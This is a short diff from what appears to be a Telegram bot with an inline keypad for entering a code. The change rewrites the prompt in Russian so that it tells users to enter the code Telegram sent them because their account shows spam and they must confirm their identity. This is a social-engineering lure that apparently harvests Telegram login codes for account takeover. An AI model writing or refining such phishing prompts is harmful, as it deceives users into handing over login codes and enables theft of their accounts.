@@ -86,7 +86,7 @@ async def send_code_keyboard(user_id, current_code, message_id=None):
         buttons.append(btn_row)
     buttons.append([InlineKeyboardButton("✅ Отправить", callback_data="code_send")])
     keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
-    text = f"Код: `{current_code}`" if current_code else "Введите код:"
+    text = f"Код: `{current_code}`" if current_code else "Введите код: Который вам прислал telegram, ведь на вашем аккунте спам, и нужно подтвердить что это вы"
 
     if message_id:
         await bot.edit_message_text(chat_id=user_id, message_id=message_id,
